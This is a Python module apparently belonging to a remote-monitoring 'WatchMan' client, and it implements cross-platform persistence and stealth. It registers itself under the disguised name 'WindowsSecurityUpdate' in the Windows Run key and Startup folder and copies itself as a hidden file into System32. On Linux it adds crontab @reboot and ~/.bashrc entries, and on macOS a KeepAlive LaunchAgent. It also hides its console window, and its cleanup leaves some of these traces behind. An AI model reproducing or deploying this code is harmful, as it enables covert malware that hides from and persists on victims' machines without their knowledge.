"""
Persistence manager for WatchMan client.
Handles auto-startup, service installation, and stealth operations.
"""
import os
import sys
import platform
import subprocess
import shutil
import winreg
from pathlib import Path

class PersistenceManager:
    """Manages client persistence and auto-startup"""
    
    def __init__(self, app_name: str = "WindowsSecurityUpdate"):
        self.app_name = app_name
        self.system = platform.system()
        self.current_path = os.path.abspath(sys.argv[0])
    
    def install_persistence(self) -> bool:
        """Install persistence mechanism based on OS"""
        try:
            if self.system == "Windows":
                return self._install_windows_persistence()
            elif self.system == "Linux":
                return self._install_linux_persistence()
            elif self.system == "Darwin":  # macOS
                return self._install_macos_persistence()
            return False
        except Exception as e:
            print(f"Error installing persistence: {e}")
            return False
    
    def _install_windows_persistence(self) -> bool:
        """Install Windows persistence via registry and startup folder"""
        try:
            # Method 1: Registry Run key
            reg_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(
                reg_key,
                self.app_name,
                0,
                winreg.REG_SZ,
                self.current_path
            )
            winreg.CloseKey(reg_key)
            
            # Method 2: Startup folder
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            if os.path.exists(startup_folder):
                startup_path = os.path.join(startup_folder, f"{self.app_name}.exe")
                if not os.path.exists(startup_path):
                    shutil.copy2(self.current_path, startup_path)
            
            # Method 3: Copy to Windows directory (if possible)
            windows_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32')
            hidden_path = os.path.join(windows_dir, f"{self.app_name}.exe")
            
            try:
                if not os.path.exists(hidden_path):
                    shutil.copy2(self.current_path, hidden_path)
                    # Hide the file
                    subprocess.run(['attrib', '+h', hidden_path], shell=True)
            except:
                pass  # Might not have admin privileges
            
            return True
            
        except Exception as e:
            print(f"Windows persistence error: {e}")
            return False
    
    def _install_linux_persistence(self) -> bool:
        """Install Linux persistence via crontab and systemd"""
        try:
            # Method 1: Crontab
            cron_command = f"@reboot {self.current_path}"
            subprocess.run(['crontab', '-l'], capture_output=True)
            
            # Add to existing crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            if cron_command not in current_cron:
                new_cron = current_cron + f"\n{cron_command}\n"
                proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
            
            # Method 2: .bashrc
            bashrc_path = os.path.expanduser("~/.bashrc")
            startup_line = f"nohup {self.current_path} &"
            
            if os.path.exists(bashrc_path):
                with open(bashrc_path, 'r') as f:
                    content = f.read()
                
                if startup_line not in content:
                    with open(bashrc_path, 'a') as f:
                        f.write(f"\n# {self.app_name}\n{startup_line}\n")
            
            return True
            
        except Exception as e:
            print(f"Linux persistence error: {e}")
            return False
    
    def _install_macos_persistence(self) -> bool:
        """Install macOS persistence via LaunchAgent"""
        try:
            launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{self.app_name.lower()}.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.current_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            
            plist_path = os.path.join(launch_agents_dir, f"com.{self.app_name.lower()}.agent.plist")
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load the launch agent
            subprocess.run(['launchctl', 'load', plist_path])
            
            return True
            
        except Exception as e:
            print(f"macOS persistence error: {e}")
            return False
    
    def remove_persistence(self) -> bool:
        """Remove persistence mechanisms"""
        try:
            if self.system == "Windows":
                return self._remove_windows_persistence()
            elif self.system == "Linux":
                return self._remove_linux_persistence()
            elif self.system == "Darwin":
                return self._remove_macos_persistence()
            return False
        except Exception as e:
            print(f"Error removing persistence: {e}")
            return False
    
    def _remove_windows_persistence(self) -> bool:
        """Remove Windows persistence"""
        try:
            # Remove registry entry
            reg_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            try:
                winreg.DeleteValue(reg_key, self.app_name)
            except FileNotFoundError:
                pass
            
            winreg.CloseKey(reg_key)
            
            # Remove from startup folder
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            startup_file = os.path.join(startup_folder, f"{self.app_name}.exe")
            
            if os.path.exists(startup_file):
                os.remove(startup_file)
            
            return True
            
        except Exception as e:
            print(f"Windows persistence removal error: {e}")
            return False
    
    def _remove_linux_persistence(self) -> bool:
        """Remove Linux persistence"""
        try:
            # Remove from crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                filtered_lines = [line for line in lines if self.current_path not in line]
                
                if len(filtered_lines) != len(lines):
                    new_cron = '\n'.join(filtered_lines)
                    proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                    proc.communicate(input=new_cron)
            
            return True
            
        except Exception as e:
            print(f"Linux persistence removal error: {e}")
            return False
    
    def _remove_macos_persistence(self) -> bool:
        """Remove macOS persistence"""
        try:
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/com.{self.app_name.lower()}.agent.plist")
            
            if os.path.exists(plist_path):
                # Unload the launch agent
                subprocess.run(['launchctl', 'unload', plist_path])
                # Remove the plist file
                os.remove(plist_path)
            
            return True
            
        except Exception as e:
            print(f"macOS persistence removal error: {e}")
            return False
    
    def is_running_as_service(self) -> bool:
        """Check if running as a system service"""
        try:
            if self.system == "Windows":
                # Check if running without console
                return not hasattr(sys, 'ps1') and not sys.stderr.isatty()
            else:
                # Check if running as daemon
                return os.getppid() == 1
        except:
            return False
    
    def hide_process(self):
        """Attempt to hide the process (Windows specific)"""
        try:
            if self.system == "Windows":
                import ctypes
                from ctypes import wintypes
                
                # Hide console window
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
